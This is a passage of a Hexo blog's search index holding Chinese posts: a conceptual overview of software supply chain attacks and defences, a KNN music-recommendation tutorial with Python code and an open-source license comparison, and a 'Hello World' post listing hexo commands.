href="https://blog.csdn.net/HLchaochao/article/details/111832381">https://blog.csdn.net/HLchaochao/article/details/111832381</a></p>]]></content>
      
      
      <categories>
          
          <category> 可搜索加密 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>软件供应链安全</title>
      <link href="/2022/07/08/Software-supply-chain-security/"/>
      <url>/2022/07/08/Software-supply-chain-security/</url>
      
        <content type="html"><![CDATA[<style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><h1>1. 概念</h1><p>供应链攻击是一种危害和破坏性极强的网络攻击，是针对组织供应链（上游、中游、下游）中的薄弱环节实施的网络安全攻击，涉及范围广，且难以检测。</p><p>如今，软件的依赖关系非常普遍。 经常见到项目使用数百个开源依赖项来实现某种功能，而项目作者不必亲自编写该功能。这可能意味着大多数应用程序都包含并非项目作者创作的代码。第三方或开源依赖项中可能存在的漏洞多半是依赖项，因为项目作者不能像自己编写的代码那样严格控制这些依赖项，可能会在软件供应链中产生潜在的安全风险。</p><p>举个软件供应链攻击的例子：当恶意代码被故意加入依赖项中，使用该依赖项的供应链将代码分发给受害者时，就会发生这种攻击。 供应链攻击是真实存在的。攻击供应链的方法有很多：从直接以新贡献者的身份插入恶意代码到在别人不注意的情况下接管贡献者的帐户，甚至破解签名密钥来分发不属于正式依赖项的软件。软件供应链攻击本身很少是最终目标，但提供了一个让攻击者插入恶意软件或为将来的访问提供后门的机会。</p><h1>2. 软件供应链阶段</h1><p>软件供应链包括三个阶段：软件研发阶段、软件交付阶段、软件使用阶段，不同阶段的攻击面如下：</p><div class="center"><table><thead><tr><th>阶段</th><th>攻击面</th></tr></thead><tbody><tr><td>软件研发阶段</td><td>- IDE开发工具污染攻击<br> - 三方库漏洞和后门攻击<br> - 直接源码污染攻击</td></tr><tr><td>软件交付阶段</td><td>- 软件存储替换和篡改攻击<br> - 传输劫持和捆绑下载攻击</td></tr><tr><td>软件使用阶段</td><td>- 升级劫持污染攻击<br> - 运行环境后门和漏洞攻击<br> - 三方库0Day漏洞攻击</td></tr></tbody></table></div><h1>3. 漏洞来源类型</h1><ul><li>合法供应商引入的漏洞</li><li>篡改或伪造组件的漏洞</li><li>编码过程引入的漏洞</li><li>开源组件引入的漏洞</li></ul><h1>4. 软件供应链的攻击类型</h1><div class="center"><table><thead><tr><th>攻击类型</th><th>事件</th></tr></thead><tbody><tr><td>预留后门</td><td>2013 年 6 月 棱镜门事件</td></tr><tr><td>开发工具污染</td><td>2015 年 9 月 14 日 XcodeGhost 事件</td></tr><tr><td>升级劫持</td><td>2017 年 6 月 27 日 NotPetya 勒索病毒事件</td></tr><tr><td>捆绑下载</td><td>2017 年 8 月 17 日 WireX BotNet 事件</td></tr><tr><td>源代码污染</td><td>2020 年 12 月 13 日 SolarWinds Orion 攻击事件</td></tr></tbody></table></div><h1>5. 软件供应链安全治理方法</h1><div class="center"><table><thead><tr><th>阶段</th><th>方法</th></tr></thead><tbody><tr><td>体系构建阶段</td><td>-  SDL 软件安全开发生命周期 <br> - DevSecOps ( <strong>核心理念</strong>：安全是整个 IT 团队每个人的责任，需要贯穿从开发到运营整个业务生命周期每一个环节才能提供有效保障)</td></tr><tr><td>设计阶段</td><td>- 软件供应商风险管理流程 <br> - 软件供应商评估模型 <br> - 软件供应商风险管理的作用</td></tr><tr><td>编码阶段</td><td>- 构建详细的软件物料清单 <br> - 使用基于 SCA 技术(软件成分分析)的工具</td></tr><tr><td>发布运营阶段</td><td>- 建立成熟的应急响应机制 <br> - 构建完善的运营保障工具链</td></tr></tbody></table></div><h1>6. 软件供应链安全应用实践</h1><div class="center"><table><thead><tr><th>应用</th><th>含义</th></tr></thead><tbody><tr><td>可信研发运营安全能力成熟度模型</td><td>汲取 SDL 与 DevSecOps 体系的优点，优化具体安全实践要素，是一种贯穿研发运营全生命周期的安全理念</td></tr><tr><td>云安全共享责任模型</td><td>云安全共享责任模型指出，在基础设施即服务（IaaS）、平台即服务（PaaS）和软件即服务（SaaS）三种不同的云服务模式下，云服务提供商（Cloud Service Provider，CSP）和客户之间需要分担的安全责任不同。CSP 需要承担客户在使用云服务时保障物理安全的责任，客户需要负责确保其解决方案及其数据被安全地识别、标记和正确的分类，以满足任何合规义务的责任，其余的责任则由 CSP 和客户共同承担。</td></tr><tr><td>Grafeas 开源计划</td><td>Grafeas 定义了一个 API 规范，用于管理软件资源，例如容器镜像、虚拟机镜像、JAR 文件和脚本。组织可以使用 Grafeas 来定义和聚合有关项目组件的信息。Grafeas 为组织提供了一个中央事实来源，用于在不断增长的软件开发团队和管道中跟踪和执行策略。构建工具、审计工具和合规性工具都可以使用 Grafeas API 来存储和检索有关各种软件组件的综合数据</td></tr></tbody></table></div><hr><h1>法律声明</h1><p>文章部分引用自悬镜安全与中国信息通信研究院联合制作的报告，转载或引用文章内容，不得进行如下活动：</p><p>不得擅自同意他人转载、引用本报告内容。</p><p>不得引用本报告进行商业活动或商业炒作。</p><p>本报告中的信息及观点仅供参考，悬镜安全及中国信息通信研究院对本报告拥有最终解释权</p><hr><p>ENDฅฅ</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>机器学习--KNN算法</title>
      <link href="/2022/06/30/Machine_Learning--KNN_algorithm/"/>
      <url>/2022/06/30/Machine_Learning--KNN_algorithm/</url>
      
        <content type="html"><![CDATA[<style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><h2 id="1-概述">1. 概述</h2><p>KNN算法可以说是最简单的分类算法之一，同时，它也是最常用的分类算法之一，该算法是给定一个训练数据集，对新的输入实例，在训练数据集中找到与该实例最邻近的K个实例，这K个实例的多数属于某个类，就把该输入实例分类到这个类中，类似于现实生活中少数服从多数的思想。</p><p>下面通过一个简单的例子说明一下：如下图，绿色圆要被决定赋予哪个类，是红色三角形还是蓝色四方形？如果K=3，由于红色三角形所占比例为2/3，绿色圆将被赋予红色三角形那个类，如果K=5，由于蓝色四方形比例为3/5，因此绿色圆被赋予蓝色四方形类。</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/1-1.png"></div><h2 id="2-算法流程">2. 算法流程</h2><p>在训练集中数据和标签已知的情况下，输入测试数据，将测试数据的特征与训练集中对应的特征进行相互比较，找到训练集中与之最为相似的前K个数据，则该测试数据对应的类别就是K个数据中出现次数最多的那个分类，其算法的描述为：</p><ul><li>计算已知类别数据集中的点与当前点之间的距离</li><li>按距离递增次序排序</li><li>选取与当前点距离最小的k个点</li><li>统计前k个点所在的类别出现的频率</li><li>返回前k个点出现频率最高的类别作为当前点的预测分类</li></ul><p><strong>KNN取距离度量的方式:</strong></p><p><strong>距离计算：</strong></p><p>要度量空间中点距离的话，有好几种度量方式，比如常见的曼哈顿距离计算，欧式距离计算等等。不过通常KNN算法中使用的是欧式距离，这里只是简单说一下，拿二维平面为例，，二维空间两个点的欧式距离计算公式如下：</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/2-1.png"></div><p>拓展到多维空间，则公式变成这样：</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/2-2.png"></div><p>KNN算法最简单粗暴的就是将预测点与所有点距离进行计算，然后保存并排序，选出前面K个值看看哪些类别比较多。</p><p><strong>K值选择：</strong></p><p>在实际应用中，K值一般取一个比较小的数值，例如采用交叉验证法（简单来说，就是一部分样本做训练集，一部分做测试集）来选择最优的K值。</p><ul><li><p>如果选择较小的K值，就相当于用较小的领域中的训练实例进行预测，“学习”近似误差会减小，只有与输入实例较近或相似的训练实例才会对预测结果起作用，与此同时带来的问题是“学习”的估计误差会增大，换句话说，K值的减小就意味着整体模型变得复杂，容易发生过拟合；</p></li><li><p>如果选择较大的K值，就相当于用较大领域中的训练实例进行预测，其优点是可以减少学习的估计误差，但缺点是学习的近似误差会增大。这时候，与输入实例较远（不相似的）训练实例也会对预测器作用，使预测发生错误，且K值的增大就意味着整体的模型变得简单。</p></li><li><p>K=N，则完全不足取，因为此时无论输入实例是什么，都只是简单的预测它属于在训练实例中最多的类，模型过于简单，忽略了训练实例中大量有用信息。</p></li></ul><h2 id="3-KNN算法的特点与优缺点">3. KNN算法的特点与优缺点</h2><h3 id="3-1-特点">3.1 特点</h3><p>KNN是一种非参的，惰性的算法模型。</p><ul><li><p><strong>非参：</strong> 模型不会对数据做出任何的假设，与之相对的是线性回归（我们总会假设线性回归是一条直线）。也就是说KNN建立的模型结构是根据数据来决定的。</p></li><li><p><strong>惰性：</strong> 同样是分类算法，逻辑回归需要先对数据进行大量训练，最后才会得到一个算法模型。而KNN算法却不需要，它没有明确的训练数据的过程，或者说这个过程很快。</p></li></ul><h3 id="3-2-KNN算法的优势和劣势">3.2 KNN算法的优势和劣势</h3><p><strong>优点：</strong></p><ul><li>KNN算法简洁明了，模型训练时间快</li><li>预测效果好，对异常值不敏感</li></ul><p><strong>缺点：</strong></p><ul><li>对内存要求较高，因为该算法存储了所有训练数据</li><li>预测阶段可能很慢</li><li>对不相关的功能和数据规模敏感</li></ul><h2 id="4-KNN算法的应用">4. KNN算法的应用</h2><p><strong>开发样例：</strong> <a href="https://github.com/Magi2B0y/KNN-algorithm-application">https://github.com/Magi2B0y/KNN-algorithm-application</a></p><p>在实现为用户推荐相似好友、生成每首歌的相似音乐和为用户提供推荐音乐三个功能上应用到了KNN算法</p><p><strong>数据源：</strong> 数据库中所有用户的听歌记录</p><p><strong>数据结果：</strong> 为所有用户生成相似好友，为每首歌生成相似歌曲，最后根据每首歌的相似歌曲和用户听歌记录来为用户提供推荐音乐</p><p>项目文件功能如下表：</p><div class="center"><table><thead><tr><th>文件名</th><th>功能</th></tr></thead><tbody><tr><td>main_function.py</td><td>顺序执行以下py文件</td></tr><tr><td>update_data_source.py</td><td>读取数据库中需要的数据，作为模型训练的数据集，存储在dataset下</td></tr><tr><td>other_user_recommend.py</td><td>训练得到所有用户的相似用户</td></tr><tr><td>user_listened_recommend.py</td><td>将训练得到的相似音乐和用户听歌记录相结合，得到所有用户的音乐推荐</td></tr><tr><td>insert_DB.py</td><td>将结果集重新存入数据库</td></tr></tbody></table></div><p>python文件的调用流程如下：</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/4-1.png"></div><br>关键的模型训练部分代码如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_trainset_algo</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    KNN算法使用训练集进行训练</span></span><br><span class="line"><span class="string">    :return:训练结果</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    reader = Reader(line_format=<span class="string">&#x27;user item rating timestamp&#x27;</span>, sep=<span class="string">&#x27;\t&#x27;</span>,  rating_scale=(<span class="number">0</span>, <span class="number">100</span>),skip_lines=<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 用户听歌记录文件路径</span></span><br><span class="line">    file_path = <span class="string">&quot;./dataset/user_record.txt&quot;</span></span><br><span class="line">    <span class="comment"># 加载数据集</span></span><br><span class="line">    data = Dataset.load_from_file(file_path, reader=reader)</span><br><span class="line">    <span class="comment"># 将数据集转换成矩阵形式</span></span><br><span class="line">    trainset = data.build_full_trainset()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(trainset.all_items())</span><br><span class="line">    <span class="built_in">print</span>(trainset.all_users())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 基于物品的协同过滤算法，相似度衡量方法：皮尔逊相似度</span></span><br><span class="line">    <span class="comment"># 这是一个用户数量N，矩阵大小为 N*N 的稀疏矩阵，然后get_neighbors得到的是topK个相似用户。如果想要得到相似歌曲，则需要使用基于项目的协同过滤算法，</span></span><br><span class="line">    <span class="comment"># 或者从得到的相似用户中，提取他们的播放记录（这是基于用户的协同过滤算法）</span></span><br><span class="line">    sim_options = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;pearson_baseline&#x27;</span>, <span class="string">&#x27;user_based&#x27;</span>: <span class="literal">True</span>&#125;</span><br><span class="line">    <span class="comment"># 选择KNN算法</span></span><br><span class="line">    algo = KNNBaseline(sim_options=sim_options)</span><br><span class="line">    <span class="comment"># algo = KNNBasic(sim_options=sim_options)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 训练数据集</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;开始训练······&#x27;</span>)</span><br><span class="line">    algo.fit(trainset)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;训练结束!!!!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> algo</span><br></pre></td></tr></table></figure><p><strong>输出结果集：</strong></p><p>每首音乐的10首相似音乐：</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/4-4.png"></div><p>为每位用户推荐的20首音乐：</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/4-2.png"></div><p>为每位用户推荐的10位相似好友：</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/4-3.png"></div><hr><p>在文章最后，介绍一下github开源项目不同 license 的具体含义</p><div class="center"><table><thead><tr><th>license</th><th>含义</th></tr></thead><tbody><tr><td>Apache</td><td>使用这个协议可以进行商用，可以对其修改、分发，但是要声明作者来源和你的修改以及协议。很多大型项目都使用这个协议，比如 tensorflow、puppeteer。</td></tr><tr><td>MIT</td><td>这是个人用得比较多的协议，因为比较宽松精简，只要声明版权和协议就可以了，可以商用、修改、复制、重新发布等操作。使用这个协议的就有vue、react等</td></tr><tr><td>BSD</td><td>这个和 MIT 协议类似，但未经事先明确书面许可，不得使用版权所有者的姓名或其贡献者的姓名来认可或推广从本软件衍生的产品，其它基本操作都可以使用。flask 用的就是这个协议。</td></tr><tr><td>GNU</td><td>可以私用也可以商用，但是必须声明来源，并且需要声明原有的协议，以及你的代码也必须开源出来。我们很熟悉的 Linux 就是采用这种协议。</td></tr><tr><td>NO</td><td>就是什么都不声明，但是并不意味着就可以乱来，这比声明了协议还严格。你可以使用、商用，但是你需要声明协议和来源，而且，你不能对代码进行修改、复制、再次发布。</td></tr><tr><td>Eclipse</td><td>这个协议允许你商用、复制、修改、再次发布等，需要声明来源和协议。像 java 中的 junit4 就是使用这个协议。</td></tr></tbody></table></div><p>以下以一张图来简单概述协议之间的区别：</p><div class="center"><img src="/2022/06/30/Machine_Learning--KNN_algorithm/4-5.png"></div><p>更加详细的说明请查看 <a href="https://opensource.org/licenses/alphabetical">https://opensource.org/licenses/alphabetical</a></p><hr><p>ENDฅฅ</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/04/08/hello-world/"/>
      <url>/2022/04/08/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to my Blog! This is my very first post.</p><p>my blog is based on <a href="https://hexo.io/">Hexo</a></p><p>Check: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a> for more info.</p><p>If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask the author on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start">Quick Start</h2><h3 id="Create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server-at-localhost">Run server at localhost</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Clear-the-cache-file-and-the-generated-static-file">Clear the cache file and the generated static file</h3><p>When the website shows an exception, you can try this command</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure><h3 id="Generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><hr><p><strong>ENDฅฅ</strong></p>]]></content>
      
      
      <categories>
          
          <category> Welcome，欢迎 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Welcome </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
